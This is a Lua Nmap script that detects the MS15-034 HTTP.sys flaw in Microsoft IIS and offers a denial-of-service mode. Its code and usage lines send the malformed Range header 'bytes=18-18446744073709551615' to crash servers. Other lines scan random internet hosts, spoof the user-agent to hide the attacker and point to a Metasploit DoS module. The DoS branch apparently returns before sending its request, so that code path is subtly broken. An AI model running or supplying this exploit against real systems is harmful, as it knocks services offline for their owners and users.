-- Original nse module written by: DigitalStroopwafel
-- Port nmap nse script to: /usr/share/nmap/scripts
-- Update database: sudo nmap --script-updatedb
-- Usage: sudo nmap --script-help ms15-034.nse
-- Usage: sudo nmap -sV -Pn -p 80 --script ms15-034.nse <target>
-- Usage: sudo nmap -sS -Pn -p 80 --script ms15-034.nse --script-args "uri=/welcome.png, D0S=exploit" <target>


-- Dependencies (Lua libs)
-- all dependencies are satisfied (nmap default installation)..
local http = require('http')
local string = require('string')
local shortport = require('shortport')
local stdnse = require ('stdnse')
local vulns = require ('vulns')


description = [[

author: DigitalStroopwafel, r00t-3xp10it
Detects for the MS15-034 (HTTP.sys) vulnerability on Microsoft IIS servers. and exploit
it using script args (--script-args D0S=exploit) or we can scan further using another
argument (--script-args uri=/wellcome.png), Affected versions are Windows 7, 8,
8.1, Windows Server 2008 R2, 2012 and 2012R2.


Some syntax examples:
nmap -sV -Pn -p 80 --script vuln <target>
nmap -sV -Pn -p 80 --script ms15-034.nse <target>
nmap -sV -Pn -p 80 --script ms15-034.nse --script-args uri=/anotheruri <target>
nmap -sV -Pn -p 80,443,631,5800 --script ms15-034.nse --script-args D0S=exploit <target>
nmap -sS -Pn -p 80,443 --script ms15-034.nse --script-args "uri=/welcome.png, D0S=exploit" <target>
nmap -sS -Pn -p 80 --script ms15-034.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey),D0S=exploit" <target>
nmap -sS -sV -T3 -iR 30 -Pn -p 80,443,631,5800 --open --reason --script ms15-034.nse -oN /root/nmap-report.log

]]

---
-- @usage
-- nmap --script-help ms15-034.nse
-- nmap -sV -Pn -p 80 --script vuln <target>
-- nmap -sS -Pn -p 80 --script ms15-034.nse <target>
-- nmap -sV -Pn -p 80 --script ms15-034.nse --script-args uri=/anotheruri/ <target>
-- nmap -sV -Pn -p 80,443,631,5800 --script ms15-034.nse --script-args D0S=exploit <target>
-- nmap -sS -Pn -p 80 --script ms15-034.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey),D0S=exploit" <target>
-- nmap -sS -Pn -p 80,443 --script ms15-034.nse --script-args "uri=/welcome.png, D0S=exploit" <target>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_ms15-034: http.sys its Vulnerable
-- |   State: VULNERABLE
-- |     IDs: CVE-2015-1635
-- |     Response: 416 (exploitable)
-- |     Disclosure date: 2015-06-17
-- |     Author: DigitalStroopwafel(module)
-- |             r00t-3xp10it(review)
-- |
-- |     Description:
-- |     http.sys 'remote code execution vulnerability' and 'denial-of-service' vulnerabilitys on
-- |     HTTP protocol stack (Microsoft IIS), affected versions are Windows 7, Windows Server 2008 R2,
-- |     Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2.
-- |     Exploit: nmap -sV -p 80 --script ms15-034.nse --script-args D0S=exploit <target>
-- |     Exploit: msf > use auxiliary/dos/http/ms15_034_ulonglongadd
-- |
-- |     References:
-- |     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
-- |     https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
-- |     http://www.rapid7.com/db/modules/auxiliary/dos/http/ms15_034_ulonglongadd
-- |_
-- @args search.uri - URI to use in request -> Default: /
-- @args payload.D0S - exploit the Denial-Of-Service condition ? -> Default: false
-- @args fakeUser.agent - User-agent to send in header request -> Default: iPhone,safari
---


author = "DigitalStroopwafel, r00t-3xp10it"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "dos"}



-- THE RULES SECTION --
-- portrule = shortport.http [added port number and service to portrule]
portrule = shortport.port_or_service({80, 443, 631, 5800}, "http, https, ipp, vnc", "tcp", "open")
-- local uri = "/" [updated to use script arguments (anotheruri)]
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"


-- THE ACTION SECTION --
action = function(host, port)
-- Manipulate TCP packet 'header' with false information about attacker :D
local options = {header={}}   --> manipulate 'header' request ..
options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25" --> use iPhone,safari User-agent OR your own...
options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


-- special thanks to 'sathisharthars' POC 'https://goo.gl/lVO1x3'
-- change this script range byte from "0-" to "18-" to exploit D0S
-- using script args to run denial-of-service or scanning for vulnerability
local D0S = stdnse.get_script_args(SCRIPT_NAME..".D0S")
  if (D0S == "exploit") then
    options['header']['Range'] = "bytes=18-18446744073709551615"
    return "Executing Denial-Of-Service Condition...\nstatus  : please ping target to comfirm tango down..."
  else
    options['header']['Range'] = "bytes=0-18446744073709551615"
end


-- get response from target website
local response = http.get(host, port, uri, options)
local title = string.match(response.body, "<[Tt][Ii][Tt][Ll][Ee][^>]*>([^<]*)</[Tt][Ii][Tt][Ll][Ee]>")

-- display target response (script output)
if ( title == "Requested Range Not Satisfiable" ) then
  return "http.sys its Vulnerable\n   State: VULNERABLE\n     IDs: CVE-2015-1635\n     Response: "..response.status.." (exploitable)\n     Disclosure date: 2015-06-17\n     Author: DigitalStroopwafel(module)\n             r00t-3xp10it(review)\n\n     Description:\n     http.sys 'remote code execution vulnerability' and 'denial-of-service' vulnerabilitys on\n     on HTTP protocol stack (Microsoft IIS), affected versions are Windows 7, Windows Server 2008 R2,\n     Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2.\n     Exploit: nmap -sV -p 80 --script ms15-034.nse --script-args D0S=exploit <target>\n     Exploit: msf > use auxiliary/dos/http/ms15_034_ulonglongadd\n\n     References:\n     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635\n     https://technet.microsoft.com/en-us/library/security/ms15-034.aspx\n     http://www.rapid7.com/db/modules/auxiliary/dos/http/ms15_034_ulonglongadd\n\n"

else

  return "http.sys not Vulnerable\n   State: NOT VULNERABLE\n     IDs: CVE-2015-1635\n     Response: "..response.status.." (we need: 416)\n     Disclosure date: 2015-06-17\n     Author: DigitalStroopwafel(module)\n             r00t-3xp10it(review)\n\n"

  end
end
